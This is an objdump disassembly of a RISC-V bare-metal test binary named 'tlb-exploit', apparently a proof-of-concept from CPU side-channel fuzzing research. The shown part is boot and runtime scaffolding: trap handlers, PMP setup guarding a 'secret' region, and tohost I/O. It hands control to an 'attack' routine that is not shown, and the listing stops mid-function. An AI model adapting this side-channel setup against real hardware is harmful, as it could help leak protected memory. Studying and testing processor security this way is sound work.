
/mnt/milesan-meta/pocs/specdoctor/tlb-attack/Template/tlb-exploit.riscv:     file format elf64-littleriscv


Disassembly of section .text.init:

0000000080000000 <_start>:
    80000000:	03c0006f          	j	8000003c <handle_reset>

0000000080000004 <nmi_vector>:
    80000004:	0000006f          	j	80000004 <nmi_vector>

0000000080000008 <mtvec_handler>:
    80000008:	00300193          	li	gp,3
    8000000c:	00007517          	auipc	a0,0x7
    80000010:	ff450513          	add	a0,a0,-12 # 80007000 <tohost>
    80000014:	00353023          	sd	gp,0(a0)
    80000018:	ffdff06f          	j	80000014 <mtvec_handler+0xc>

000000008000001c <stvec_handler>:
    8000001c:	00018663          	beqz	gp,80000028 <stvec_handler+0xc>
    80000020:	14119073          	csrw	sepc,gp
    80000024:	10200073          	sret
    80000028:	00100193          	li	gp,1
    8000002c:	00007517          	auipc	a0,0x7
    80000030:	fd450513          	add	a0,a0,-44 # 80007000 <tohost>
    80000034:	00353023          	sd	gp,0(a0)
    80000038:	ffdff06f          	j	80000034 <stvec_handler+0x18>

000000008000003c <handle_reset>:
    8000003c:	3a005073          	csrw	pmpcfg0,0
    80000040:	30005073          	csrw	mstatus,0
    80000044:	00000093          	li	ra,0
    80000048:	00000113          	li	sp,0
    8000004c:	00000193          	li	gp,0
    80000050:	00000213          	li	tp,0
    80000054:	00000293          	li	t0,0
    80000058:	00000313          	li	t1,0
    8000005c:	00000393          	li	t2,0
    80000060:	00000413          	li	s0,0
    80000064:	00000493          	li	s1,0
    80000068:	00000513          	li	a0,0
    8000006c:	00000593          	li	a1,0
    80000070:	00000613          	li	a2,0
    80000074:	00000693          	li	a3,0
    80000078:	00000713          	li	a4,0
    8000007c:	00000793          	li	a5,0
    80000080:	00000813          	li	a6,0
    80000084:	00000893          	li	a7,0
    80000088:	00000913          	li	s2,0
    8000008c:	00000993          	li	s3,0
    80000090:	00000a13          	li	s4,0
    80000094:	00000a93          	li	s5,0
    80000098:	00000b13          	li	s6,0
    8000009c:	00000b93          	li	s7,0
    800000a0:	00000c13          	li	s8,0
    800000a4:	00000c93          	li	s9,0
    800000a8:	00000d13          	li	s10,0
    800000ac:	00000d93          	li	s11,0
    800000b0:	00000e13          	li	t3,0
    800000b4:	00000e93          	li	t4,0
    800000b8:	00000f13          	li	t5,0
    800000bc:	00000f93          	li	t6,0
    800000c0:	000062b7          	lui	t0,0x6
    800000c4:	3002a073          	csrs	mstatus,t0
    800000c8:	00000297          	auipc	t0,0x0
    800000cc:	08c28293          	add	t0,t0,140 # 80000154 <handle_reset+0x118>
    800000d0:	30529073          	csrw	mtvec,t0
    800000d4:	f0000053          	fmv.w.x	ft0,zero
    800000d8:	f00000d3          	fmv.w.x	ft1,zero
    800000dc:	f0000153          	fmv.w.x	ft2,zero
    800000e0:	f00001d3          	fmv.w.x	ft3,zero
    800000e4:	f0000253          	fmv.w.x	ft4,zero
    800000e8:	f00002d3          	fmv.w.x	ft5,zero
    800000ec:	f0000353          	fmv.w.x	ft6,zero
    800000f0:	f00003d3          	fmv.w.x	ft7,zero
    800000f4:	f0000453          	fmv.w.x	fs0,zero
    800000f8:	f00004d3          	fmv.w.x	fs1,zero
    800000fc:	f0000553          	fmv.w.x	fa0,zero
    80000100:	f00005d3          	fmv.w.x	fa1,zero
    80000104:	f0000653          	fmv.w.x	fa2,zero
    80000108:	f00006d3          	fmv.w.x	fa3,zero
    8000010c:	f0000753          	fmv.w.x	fa4,zero
    80000110:	f00007d3          	fmv.w.x	fa5,zero
    80000114:	f0000853          	fmv.w.x	fa6,zero
    80000118:	f00008d3          	fmv.w.x	fa7,zero
    8000011c:	f0000953          	fmv.w.x	fs2,zero
    80000120:	f00009d3          	fmv.w.x	fs3,zero
    80000124:	f0000a53          	fmv.w.x	fs4,zero
    80000128:	f0000ad3          	fmv.w.x	fs5,zero
    8000012c:	f0000b53          	fmv.w.x	fs6,zero
    80000130:	f0000bd3          	fmv.w.x	fs7,zero
    80000134:	f0000c53          	fmv.w.x	fs8,zero
    80000138:	f0000cd3          	fmv.w.x	fs9,zero
    8000013c:	f0000d53          	fmv.w.x	fs10,zero
    80000140:	f0000dd3          	fmv.w.x	fs11,zero
    80000144:	f0000e53          	fmv.w.x	ft8,zero
    80000148:	f0000ed3          	fmv.w.x	ft9,zero
    8000014c:	f0000f53          	fmv.w.x	ft10,zero
    80000150:	f0000fd3          	fmv.w.x	ft11,zero
    80000154:	00000297          	auipc	t0,0x0
    80000158:	eb428293          	add	t0,t0,-332 # 80000008 <mtvec_handler>
    8000015c:	30529073          	csrw	mtvec,t0
    80000160:	00000297          	auipc	t0,0x0
    80000164:	ebc28293          	add	t0,t0,-324 # 8000001c <stvec_handler>
    80000168:	10529073          	csrw	stvec,t0
    8000016c:	0000a117          	auipc	sp,0xa
    80000170:	e9410113          	add	sp,sp,-364 # 8000a000 <_end+0x1000>
    80000174:	0000b217          	auipc	tp,0xb
    80000178:	e8c20213          	add	tp,tp,-372 # 8000b000 <_end+0x2000>
    8000017c:	00100513          	li	a0,1
    80000180:	30652073          	csrs	mcounteren,a0
    80000184:	00002537          	lui	a0,0x2
    80000188:	8005051b          	addw	a0,a0,-2048 # 1800 <threadsense.2+0x177c>
    8000018c:	30053073          	csrc	mstatus,a0
    80000190:	00001537          	lui	a0,0x1
    80000194:	8005051b          	addw	a0,a0,-2048 # 800 <threadsense.2+0x77c>
    80000198:	30052073          	csrs	mstatus,a0
    8000019c:	00200297          	auipc	t0,0x200
    800001a0:	e6428293          	add	t0,t0,-412 # 80200000 <attack>
    800001a4:	34129073          	csrw	mepc,t0
    800001a8:	30200073          	mret

Disassembly of section .bss:

0000000080001000 <count.2>:
    80001000:	0000                	.2byte	0x0
	...

0000000080001004 <sense.1>:
	...

0000000080002000 <pt>:
	...

0000000080006000 <count.1>:
    80006000:	0000                	.2byte	0x0
	...

0000000080006004 <sense.0>:
    80006004:	0000                	.2byte	0x0
	...

Disassembly of section .tohost:

0000000080007000 <tohost>:
	...

0000000080007040 <fromhost>:
	...

Disassembly of section .text:

0000000080007048 <pmp_boot>:
    80007048:	fe010113          	add	sp,sp,-32
    8000704c:	00813c23          	sd	s0,24(sp)
    80007050:	02010413          	add	s0,sp,32
    80007054:	01f00793          	li	a5,31
    80007058:	fef43423          	sd	a5,-24(s0)
    8000705c:	fff00793          	li	a5,-1
    80007060:	00b7d793          	srl	a5,a5,0xb
    80007064:	fef43023          	sd	a5,-32(s0)
    80007068:	fe843783          	ld	a5,-24(s0)
    8000706c:	fe043703          	ld	a4,-32(s0)
    80007070:	00000297          	auipc	t0,0x0
    80007074:	01c28293          	add	t0,t0,28 # 8000708c <pmp_boot+0x44>
    80007078:	305292f3          	csrrw	t0,mtvec,t0
    8000707c:	3b771073          	csrw	pmpaddr7,a4
    80007080:	00078513          	mv	a0,a5
    80007084:	03851513          	sll	a0,a0,0x38
    80007088:	3a051073          	csrw	pmpcfg0,a0
    8000708c:	30529073          	csrw	mtvec,t0
    80007090:	01800793          	li	a5,24
    80007094:	fef43423          	sd	a5,-24(s0)
    80007098:	007f9797          	auipc	a5,0x7f9
    8000709c:	f6878793          	add	a5,a5,-152 # 80800000 <secret>
    800070a0:	0027d793          	srl	a5,a5,0x2
    800070a4:	1ff7e793          	or	a5,a5,511
    800070a8:	fef43023          	sd	a5,-32(s0)
    800070ac:	fe843783          	ld	a5,-24(s0)
    800070b0:	fe043703          	ld	a4,-32(s0)
    800070b4:	3b071073          	csrw	pmpaddr0,a4
    800070b8:	3a07a073          	csrs	pmpcfg0,a5
    800070bc:	00000013          	nop
    800070c0:	01813403          	ld	s0,24(sp)
    800070c4:	02010113          	add	sp,sp,32
    800070c8:	00008067          	ret

00000000800070cc <printArray>:
    800070cc:	fd010113          	add	sp,sp,-48
    800070d0:	02813423          	sd	s0,40(sp)
    800070d4:	03010413          	add	s0,sp,48
    800070d8:	fea43423          	sd	a0,-24(s0)
    800070dc:	00058793          	mv	a5,a1
    800070e0:	fcc43c23          	sd	a2,-40(s0)
    800070e4:	fef42223          	sw	a5,-28(s0)
    800070e8:	00000013          	nop
    800070ec:	02813403          	ld	s0,40(sp)
    800070f0:	03010113          	add	sp,sp,48
    800070f4:	00008067          	ret

00000000800070f8 <printDoubleArray>:
    800070f8:	fd010113          	add	sp,sp,-48
    800070fc:	02813423          	sd	s0,40(sp)
    80007100:	03010413          	add	s0,sp,48
    80007104:	fea43423          	sd	a0,-24(s0)
    80007108:	00058793          	mv	a5,a1
    8000710c:	fcc43c23          	sd	a2,-40(s0)
    80007110:	fef42223          	sw	a5,-28(s0)
    80007114:	00000013          	nop
    80007118:	02813403          	ld	s0,40(sp)
    8000711c:	03010113          	add	sp,sp,48
    80007120:	00008067          	ret

0000000080007124 <verify>:
    80007124:	fb010113          	add	sp,sp,-80
    80007128:	04813423          	sd	s0,72(sp)
    8000712c:	05010413          	add	s0,sp,80
    80007130:	00050793          	mv	a5,a0
    80007134:	fcb43023          	sd	a1,-64(s0)
    80007138:	fac43c23          	sd	a2,-72(s0)
    8000713c:	fcf42623          	sw	a5,-52(s0)
    80007140:	fe042623          	sw	zero,-20(s0)
    80007144:	0c80006f          	j	8000720c <verify+0xe8>
    80007148:	fec42783          	lw	a5,-20(s0)
    8000714c:	00279793          	sll	a5,a5,0x2
    80007150:	fc043703          	ld	a4,-64(s0)
    80007154:	00f707b3          	add	a5,a4,a5
    80007158:	0007a783          	lw	a5,0(a5)
    8000715c:	fef42423          	sw	a5,-24(s0)
    80007160:	fec42783          	lw	a5,-20(s0)
    80007164:	00178793          	add	a5,a5,1
    80007168:	00279793          	sll	a5,a5,0x2
    8000716c:	fc043703          	ld	a4,-64(s0)
    80007170:	00f707b3          	add	a5,a4,a5
    80007174:	0007a783          	lw	a5,0(a5)
    80007178:	fef42223          	sw	a5,-28(s0)
    8000717c:	fec42783          	lw	a5,-20(s0)
    80007180:	00279793          	sll	a5,a5,0x2
    80007184:	fb843703          	ld	a4,-72(s0)
    80007188:	00f707b3          	add	a5,a4,a5
    8000718c:	0007a783          	lw	a5,0(a5)
    80007190:	fef42023          	sw	a5,-32(s0)
    80007194:	fec42783          	lw	a5,-20(s0)
    80007198:	00178793          	add	a5,a5,1
    8000719c:	00279793          	sll	a5,a5,0x2
    800071a0:	fb843703          	ld	a4,-72(s0)
    800071a4:	00f707b3          	add	a5,a4,a5
    800071a8:	0007a783          	lw	a5,0(a5)
    800071ac:	fcf42e23          	sw	a5,-36(s0)
    800071b0:	fe842783          	lw	a5,-24(s0)
    800071b4:	00078713          	mv	a4,a5
    800071b8:	fe042783          	lw	a5,-32(s0)
    800071bc:	0007071b          	sext.w	a4,a4
    800071c0:	0007879b          	sext.w	a5,a5
    800071c4:	00f70a63          	beq	a4,a5,800071d8 <verify+0xb4>
    800071c8:	fec42783          	lw	a5,-20(s0)
    800071cc:	0017879b          	addw	a5,a5,1
    800071d0:	0007879b          	sext.w	a5,a5
    800071d4:	0b80006f          	j	8000728c <verify+0x168>
    800071d8:	fe442783          	lw	a5,-28(s0)
    800071dc:	00078713          	mv	a4,a5
    800071e0:	fdc42783          	lw	a5,-36(s0)
    800071e4:	0007071b          	sext.w	a4,a4
    800071e8:	0007879b          	sext.w	a5,a5
    800071ec:	00f70a63          	beq	a4,a5,80007200 <verify+0xdc>
    800071f0:	fec42783          	lw	a5,-20(s0)
    800071f4:	0027879b          	addw	a5,a5,2
    800071f8:	0007879b          	sext.w	a5,a5
    800071fc:	0900006f          	j	8000728c <verify+0x168>
    80007200:	fec42783          	lw	a5,-20(s0)
    80007204:	0027879b          	addw	a5,a5,2
    80007208:	fef42623          	sw	a5,-20(s0)
    8000720c:	fcc42783          	lw	a5,-52(s0)
    80007210:	01f7d71b          	srlw	a4,a5,0x1f
    80007214:	00f707bb          	addw	a5,a4,a5
    80007218:	4017d79b          	sraw	a5,a5,0x1
    8000721c:	0007879b          	sext.w	a5,a5
    80007220:	0017979b          	sllw	a5,a5,0x1
    80007224:	0007871b          	sext.w	a4,a5
    80007228:	fec42783          	lw	a5,-20(s0)
    8000722c:	0007879b          	sext.w	a5,a5
    80007230:	f0e7cce3          	blt	a5,a4,80007148 <verify+0x24>
    80007234:	fcc42783          	lw	a5,-52(s0)
    80007238:	0017f793          	and	a5,a5,1
    8000723c:	0007879b          	sext.w	a5,a5
    80007240:	04078463          	beqz	a5,80007288 <verify+0x164>
    80007244:	fcc42783          	lw	a5,-52(s0)
    80007248:	00279793          	sll	a5,a5,0x2
    8000724c:	ffc78793          	add	a5,a5,-4
    80007250:	fc043703          	ld	a4,-64(s0)
    80007254:	00f707b3          	add	a5,a4,a5
    80007258:	0007a783          	lw	a5,0(a5)
    8000725c:	0007869b          	sext.w	a3,a5
    80007260:	fcc42783          	lw	a5,-52(s0)
    80007264:	00279793          	sll	a5,a5,0x2
    80007268:	ffc78793          	add	a5,a5,-4
    8000726c:	fb843703          	ld	a4,-72(s0)
    80007270:	00f707b3          	add	a5,a4,a5
    80007274:	0007a783          	lw	a5,0(a5)
    80007278:	00068713          	mv	a4,a3
    8000727c:	00f70663          	beq	a4,a5,80007288 <verify+0x164>
    80007280:	fcc42783          	lw	a5,-52(s0)
    80007284:	0080006f          	j	8000728c <verify+0x168>
    80007288:	00000793          	li	a5,0
    8000728c:	00078513          	mv	a0,a5
    80007290:	04813403          	ld	s0,72(sp)
    80007294:	05010113          	add	sp,sp,80
    80007298:	00008067          	ret

000000008000729c <verifyDouble>:
    8000729c:	fa010113          	add	sp,sp,-96
    800072a0:	04813c23          	sd	s0,88(sp)
    800072a4:	06010413          	add	s0,sp,96
    800072a8:	00050793          	mv	a5,a0
    800072ac:	fab43823          	sd	a1,-80(s0)
    800072b0:	fac43423          	sd	a2,-88(s0)
    800072b4:	faf42e23          	sw	a5,-68(s0)
    800072b8:	fe042623          	sw	zero,-20(s0)
    800072bc:	0dc0006f          	j	80007398 <verifyDouble+0xfc>
    800072c0:	fec42783          	lw	a5,-20(s0)
    800072c4:	00379793          	sll	a5,a5,0x3
    800072c8:	fb043703          	ld	a4,-80(s0)
    800072cc:	00f707b3          	add	a5,a4,a5
    800072d0:	0007b787          	fld	fa5,0(a5)
    800072d4:	fef43027          	fsd	fa5,-32(s0)
    800072d8:	fec42783          	lw	a5,-20(s0)
    800072dc:	00178793          	add	a5,a5,1
    800072e0:	00379793          	sll	a5,a5,0x3
    800072e4:	fb043703          	ld	a4,-80(s0)
    800072e8:	00f707b3          	add	a5,a4,a5
    800072ec:	0007b787          	fld	fa5,0(a5)
    800072f0:	fcf43c27          	fsd	fa5,-40(s0)
    800072f4:	fec42783          	lw	a5,-20(s0)
    800072f8:	00379793          	sll	a5,a5,0x3
    800072fc:	fa843703          	ld	a4,-88(s0)
    80007300:	00f707b3          	add	a5,a4,a5
    80007304:	0007b787          	fld	fa5,0(a5)
    80007308:	fcf43827          	fsd	fa5,-48(s0)
    8000730c:	fec42783          	lw	a5,-20(s0)
    80007310:	00178793          	add	a5,a5,1
    80007314:	00379793          	sll	a5,a5,0x3
    80007318:	fa843703          	ld	a4,-88(s0)
    8000731c:	00f707b3          	add	a5,a4,a5
    80007320:	0007b787          	fld	fa5,0(a5)
    80007324:	fcf43427          	fsd	fa5,-56(s0)
    80007328:	fe043707          	fld	fa4,-32(s0)
    8000732c:	fd043787          	fld	fa5,-48(s0)
    80007330:	a2f727d3          	feq.d	a5,fa4,fa5
    80007334:	00f037b3          	snez	a5,a5
    80007338:	0ff7f793          	zext.b	a5,a5
    8000733c:	fcf42223          	sw	a5,-60(s0)
    80007340:	fd843707          	fld	fa4,-40(s0)
    80007344:	fc843787          	fld	fa5,-56(s0)
    80007348:	a2f727d3          	feq.d	a5,fa4,fa5
    8000734c:	00f037b3          	snez	a5,a5
    80007350:	0ff7f793          	zext.b	a5,a5
    80007354:	fcf42023          	sw	a5,-64(s0)
    80007358:	fc442783          	lw	a5,-60(s0)
    8000735c:	00078713          	mv	a4,a5
    80007360:	fc042783          	lw	a5,-64(s0)
    80007364:	00f777b3          	and	a5,a4,a5
    80007368:	0007879b          	sext.w	a5,a5
    8000736c:	02079063          	bnez	a5,8000738c <verifyDouble+0xf0>
    80007370:	fec42783          	lw	a5,-20(s0)
    80007374:	0017879b          	addw	a5,a5,1
    80007378:	0007879b          	sext.w	a5,a5
    8000737c:	fc442703          	lw	a4,-60(s0)
    80007380:	00f707bb          	addw	a5,a4,a5
    80007384:	0007879b          	sext.w	a5,a5
    80007388:	08c0006f          	j	80007414 <verifyDouble+0x178>
    8000738c:	fec42783          	lw	a5,-20(s0)
    80007390:	0027879b          	addw	a5,a5,2
    80007394:	fef42623          	sw	a5,-20(s0)
    80007398:	fbc42783          	lw	a5,-68(s0)
    8000739c:	01f7d71b          	srlw	a4,a5,0x1f
    800073a0:	00f707bb          	addw	a5,a4,a5
    800073a4:	4017d79b          	sraw	a5,a5,0x1
    800073a8:	0007879b          	sext.w	a5,a5
    800073ac:	0017979b          	sllw	a5,a5,0x1
    800073b0:	0007871b          	sext.w	a4,a5
    800073b4:	fec42783          	lw	a5,-20(s0)
    800073b8:	0007879b          	sext.w	a5,a5
    800073bc:	f0e7c2e3          	blt	a5,a4,800072c0 <verifyDouble+0x24>
    800073c0:	fbc42783          	lw	a5,-68(s0)
    800073c4:	0017f793          	and	a5,a5,1
    800073c8:	0007879b          	sext.w	a5,a5
    800073cc:	04078263          	beqz	a5,80007410 <verifyDouble+0x174>
    800073d0:	fbc42783          	lw	a5,-68(s0)
    800073d4:	00379793          	sll	a5,a5,0x3
    800073d8:	ff878793          	add	a5,a5,-8
    800073dc:	fb043703          	ld	a4,-80(s0)
    800073e0:	00f707b3          	add	a5,a4,a5
    800073e4:	0007b707          	fld	fa4,0(a5)
    800073e8:	fbc42783          	lw	a5,-68(s0)
    800073ec:	00379793          	sll	a5,a5,0x3
    800073f0:	ff878793          	add	a5,a5,-8
    800073f4:	fa843703          	ld	a4,-88(s0)
    800073f8:	00f707b3          	add	a5,a4,a5
    800073fc:	0007b787          	fld	fa5,0(a5)
    80007400:	a2f727d3          	feq.d	a5,fa4,fa5
    80007404:	00079663          	bnez	a5,80007410 <verifyDouble+0x174>
    80007408:	fbc42783          	lw	a5,-68(s0)
    8000740c:	0080006f          	j	80007414 <verifyDouble+0x178>
    80007410:	00000793          	li	a5,0
    80007414:	00078513          	mv	a0,a5
    80007418:	05813403          	ld	s0,88(sp)
    8000741c:	06010113          	add	sp,sp,96
    80007420:	00008067          	ret

0000000080007424 <barrier>:
    80007424:	fe010113          	add	sp,sp,-32
    80007428:	00813c23          	sd	s0,24(sp)
    8000742c:	02010413          	add	s0,sp,32
    80007430:	00050793          	mv	a5,a0
    80007434:	fef42623          	sw	a5,-20(s0)
    80007438:	0ff0000f          	fence
    8000743c:	00022783          	lw	a5,0(tp) # 0 <threadsense.5>
    80007440:	0017b793          	seqz	a5,a5
    80007444:	0ff7f793          	zext.b	a5,a5
    80007448:	0007871b          	sext.w	a4,a5
    8000744c:	00e22023          	sw	a4,0(tp) # 0 <threadsense.5>
    80007450:	ffffa797          	auipc	a5,0xffffa
    80007454:	bb078793          	add	a5,a5,-1104 # 80001000 <count.2>
    80007458:	00100713          	li	a4,1
    8000745c:	0f50000f          	fence	iorw,ow
    80007460:	04e7a6af          	amoadd.w.aq	a3,a4,(a5)
    80007464:	0006879b          	sext.w	a5,a3
    80007468:	0007871b          	sext.w	a4,a5
    8000746c:	fec42783          	lw	a5,-20(s0)
    80007470:	fff7879b          	addw	a5,a5,-1
    80007474:	0007879b          	sext.w	a5,a5
    80007478:	02f71263          	bne	a4,a5,8000749c <barrier+0x78>
    8000747c:	ffffa797          	auipc	a5,0xffffa
    80007480:	b8478793          	add	a5,a5,-1148 # 80001000 <count.2>
    80007484:	0007a023          	sw	zero,0(a5)
    80007488:	00022703          	lw	a4,0(tp) # 0 <threadsense.5>
    8000748c:	ffffa797          	auipc	a5,0xffffa
    80007490:	b7878793          	add	a5,a5,-1160 # 80001004 <sense.1>
    80007494:	00e7a023          	sw	a4,0(a5)
    80007498:	0200006f          	j	800074b8 <barrier+0x94>
    8000749c:	00000013          	nop
    800074a0:	ffffa797          	auipc	a5,0xffffa
    800074a4:	b6478793          	add	a5,a5,-1180 # 80001004 <sense.1>
    800074a8:	0007a783          	lw	a5,0(a5)
    800074ac:	0007871b          	sext.w	a4,a5
    800074b0:	00022783          	lw	a5,0(tp) # 0 <threadsense.5>
    800074b4:	fef716e3          	bne	a4,a5,800074a0 <barrier+0x7c>
    800074b8:	0ff0000f          	fence
    800074bc:	00000013          	nop
    800074c0:	01813403          	ld	s0,24(sp)
    800074c4:	02010113          	add	sp,sp,32
    800074c8:	00008067          	ret

00000000800074cc <lfsr>:
    800074cc:	fd010113          	add	sp,sp,-48
    800074d0:	02813423          	sd	s0,40(sp)
    800074d4:	03010413          	add	s0,sp,48
    800074d8:	fca43c23          	sd	a0,-40(s0)
    800074dc:	fd843783          	ld	a5,-40(s0)
    800074e0:	0017d713          	srl	a4,a5,0x1
    800074e4:	fd843783          	ld	a5,-40(s0)
    800074e8:	00f747b3          	xor	a5,a4,a5
    800074ec:	0017f793          	and	a5,a5,1
    800074f0:	fef43423          	sd	a5,-24(s0)
    800074f4:	fd843783          	ld	a5,-40(s0)
    800074f8:	0017d713          	srl	a4,a5,0x1
    800074fc:	fe843783          	ld	a5,-24(s0)
    80007500:	03e79793          	sll	a5,a5,0x3e
    80007504:	00f767b3          	or	a5,a4,a5
    80007508:	00078513          	mv	a0,a5
    8000750c:	02813403          	ld	s0,40(sp)
    80007510:	03010113          	add	sp,sp,48
    80007514:	00008067          	ret

0000000080007518 <lfsr10>:
    80007518:	fd010113          	add	sp,sp,-48
    8000751c:	02813423          	sd	s0,40(sp)
    80007520:	03010413          	add	s0,sp,48
    80007524:	fca43c23          	sd	a0,-40(s0)
    80007528:	fd843783          	ld	a5,-40(s0)
    8000752c:	00a7d713          	srl	a4,a5,0xa
    80007530:	fd843783          	ld	a5,-40(s0)
    80007534:	00f747b3          	xor	a5,a4,a5
    80007538:	3ff7f793          	and	a5,a5,1023
    8000753c:	fef43423          	sd	a5,-24(s0)
    80007540:	fd843783          	ld	a5,-40(s0)
    80007544:	00a7d713          	srl	a4,a5,0xa
    80007548:	fe843783          	ld	a5,-24(s0)
    8000754c:	03579793          	sll	a5,a5,0x35
    80007550:	00f767b3          	or	a5,a4,a5
    80007554:	00078513          	mv	a0,a5
    80007558:	02813403          	ld	s0,40(sp)
    8000755c:	03010113          	add	sp,sp,48
    80007560:	00008067          	ret

0000000080007564 <syscall>:
    80007564:	f5010113          	add	sp,sp,-176
    80007568:	0a813423          	sd	s0,168(sp)
    8000756c:	0b010413          	add	s0,sp,176
    80007570:	f6a43c23          	sd	a0,-136(s0)
    80007574:	f6b43823          	sd	a1,-144(s0)
    80007578:	f6c43423          	sd	a2,-152(s0)
    8000757c:	f6d43023          	sd	a3,-160(s0)
    80007580:	ff040793          	add	a5,s0,-16
    80007584:	f4f43c23          	sd	a5,-168(s0)
    80007588:	f5843783          	ld	a5,-168(s0)
    8000758c:	f9078793          	add	a5,a5,-112
    80007590:	03f78793          	add	a5,a5,63
    80007594:	0067d793          	srl	a5,a5,0x6
    80007598:	00679793          	sll	a5,a5,0x6
    8000759c:	f7843703          	ld	a4,-136(s0)
    800075a0:	00e7b023          	sd	a4,0(a5)
    800075a4:	f7043703          	ld	a4,-144(s0)
    800075a8:	00e7b423          	sd	a4,8(a5)
    800075ac:	f6843703          	ld	a4,-152(s0)
    800075b0:	00e7b823          	sd	a4,16(a5)
    800075b4:	f6043703          	ld	a4,-160(s0)
    800075b8:	00e7bc23          	sd	a4,24(a5)
    800075bc:	0ff0000f          	fence
    800075c0:	00078693          	mv	a3,a5
    800075c4:	00000717          	auipc	a4,0x0
    800075c8:	a3c70713          	add	a4,a4,-1476 # 80007000 <tohost>
    800075cc:	00d73023          	sd	a3,0(a4)
    800075d0:	00000013          	nop
    800075d4:	00000717          	auipc	a4,0x0
    800075d8:	a6c70713          	add	a4,a4,-1428 # 80007040 <fromhost>
    800075dc:	00073703          	ld	a4,0(a4)
    800075e0:	fe070ae3          	beqz	a4,800075d4 <syscall+0x70>
    800075e4:	00000717          	auipc	a4,0x0
    800075e8:	a5c70713          	add	a4,a4,-1444 # 80007040 <fromhost>
    800075ec:	00073023          	sd	zero,0(a4)
    800075f0:	0ff0000f          	fence
    800075f4:	0007b783          	ld	a5,0(a5)
    800075f8:	00078513          	mv	a0,a5
    800075fc:	0a813403          	ld	s0,168(sp)
    80007600:	0b010113          	add	sp,sp,176
    80007604:	00008067          	ret

0000000080007608 <tohost_exit>:
    80007608:	fe010113          	add	sp,sp,-32
    8000760c:	00813c23          	sd	s0,24(sp)
    80007610:	02010413          	add	s0,sp,32
    80007614:	fea43423          	sd	a0,-24(s0)
    80007618:	fe843783          	ld	a5,-24(s0)
    8000761c:	00179793          	sll	a5,a5,0x1
    80007620:	0017e713          	or	a4,a5,1
    80007624:	00000797          	auipc	a5,0x0
    80007628:	9dc78793          	add	a5,a5,-1572 # 80007000 <tohost>
    8000762c:	00e7b023          	sd	a4,0(a5)
    80007630:	00000013          	nop
    80007634:	ffdff06f          	j	80007630 <tohost_exit+0x28>

0000000080007638 <handle_trap>:
    80007638:	fd010113          	add	sp,sp,-48
    8000763c:	02113423          	sd	ra,40(sp)
    80007640:	02813023          	sd	s0,32(sp)
    80007644:	03010413          	add	s0,sp,48
    80007648:	fea43423          	sd	a0,-24(s0)
    8000764c:	feb43023          	sd	a1,-32(s0)
    80007650:	fcc43c23          	sd	a2,-40(s0)
    80007654:	53900513          	li	a0,1337
    80007658:	fb1ff0ef          	jal	80007608 <tohost_exit>

000000008000765c <exit>:
    8000765c:	fe010113          	add	sp,sp,-32
    80007660:	00113c23          	sd	ra,24(sp)
    80007664:	00813823          	sd	s0,16(sp)
    80007668:	02010413          	add	s0,sp,32
    8000766c:	00050793          	mv	a5,a0
    80007670:	fef42623          	sw	a5,-20(s0)
    80007674:	fec42783          	lw	a5,-20(s0)
    80007678:	00078513          	mv	a0,a5
    8000767c:	f8dff0ef          	jal	80007608 <tohost_exit>

0000000080007680 <abort>:
    80007680:	ff010113          	add	sp,sp,-16
    80007684:	00113423          	sd	ra,8(sp)
    80007688:	00813023          	sd	s0,0(sp)
    8000768c:	01010413          	add	s0,sp,16
    80007690:	08600513          	li	a0,134
    80007694:	fc9ff0ef          	jal	8000765c <exit>

0000000080007698 <printstr>:
    80007698:	fd010113          	add	sp,sp,-48
    8000769c:	02113423          	sd	ra,40(sp)
    800076a0:	02813023          	sd	s0,32(sp)
    800076a4:	00913c23          	sd	s1,24(sp)
    800076a8:	03010413          	add	s0,sp,48
    800076ac:	fca43c23          	sd	a0,-40(s0)
    800076b0:	fd843483          	ld	s1,-40(s0)
    800076b4:	fd843503          	ld	a0,-40(s0)
    800076b8:	3d9000ef          	jal	80008290 <strlen>
    800076bc:	00050793          	mv	a5,a0
    800076c0:	00078693          	mv	a3,a5
    800076c4:	00048613          	mv	a2,s1
    800076c8:	00100593          	li	a1,1
    800076cc:	04000513          	li	a0,64
    800076d0:	e95ff0ef          	jal	80007564 <syscall>
    800076d4:	00000013          	nop
    800076d8:	02813083          	ld	ra,40(sp)
    800076dc:	02013403          	ld	s0,32(sp)
    800076e0:	01813483          	ld	s1,24(sp)
    800076e4:	03010113          	add	sp,sp,48
    800076e8:	00008067          	ret

00000000800076ec <putchar>:
    800076ec:	fe010113          	add	sp,sp,-32
    800076f0:	00113c23          	sd	ra,24(sp)
    800076f4:	00813823          	sd	s0,16(sp)
    800076f8:	02010413          	add	s0,sp,32
    800076fc:	00050793          	mv	a5,a0
    80007700:	fef42623          	sw	a5,-20(s0)
    80007704:	08022783          	lw	a5,128(tp) # 80 <buflen.3>
    80007708:	0017871b          	addw	a4,a5,1
    8000770c:	0007069b          	sext.w	a3,a4
    80007710:	08d22023          	sw	a3,128(tp) # 80 <buflen.3>
    80007714:	fec42703          	lw	a4,-20(s0)
    80007718:	0ff77713          	zext.b	a4,a4
    8000771c:	04020693          	add	a3,tp,64 # 40 <buf.4>
    80007720:	00f687b3          	add	a5,a3,a5
    80007724:	00e78023          	sb	a4,0(a5)
    80007728:	fec42783          	lw	a5,-20(s0)
    8000772c:	0007871b          	sext.w	a4,a5
    80007730:	00a00793          	li	a5,10
    80007734:	00f70a63          	beq	a4,a5,80007748 <putchar+0x5c>
    80007738:	08022783          	lw	a5,128(tp) # 80 <buflen.3>
    8000773c:	00078713          	mv	a4,a5
    80007740:	04000793          	li	a5,64
    80007744:	02f71263          	bne	a4,a5,80007768 <putchar+0x7c>
    80007748:	04020713          	add	a4,tp,64 # 40 <buf.4>
    8000774c:	08022783          	lw	a5,128(tp) # 80 <buflen.3>
    80007750:	00078693          	mv	a3,a5
    80007754:	00070613          	mv	a2,a4
    80007758:	00100593          	li	a1,1
    8000775c:	04000513          	li	a0,64
    80007760:	e05ff0ef          	jal	80007564 <syscall>
    80007764:	08022023          	sw	zero,128(tp) # 80 <buflen.3>
    80007768:	00000793          	li	a5,0
    8000776c:	00078513          	mv	a0,a5
    80007770:	01813083          	ld	ra,24(sp)
    80007774:	01013403          	ld	s0,16(sp)
    80007778:	02010113          	add	sp,sp,32
    8000777c:	00008067          	ret

0000000080007780 <printhex>:
    80007780:	fc010113          	add	sp,sp,-64
    80007784:	02113c23          	sd	ra,56(sp)
    80007788:	02813823          	sd	s0,48(sp)
    8000778c:	04010413          	add	s0,sp,64
    80007790:	fca43423          	sd	a0,-56(s0)
    80007794:	fe042623          	sw	zero,-20(s0)
    80007798:	06c0006f          	j	80007804 <printhex+0x84>
    8000779c:	fc843783          	ld	a5,-56(s0)
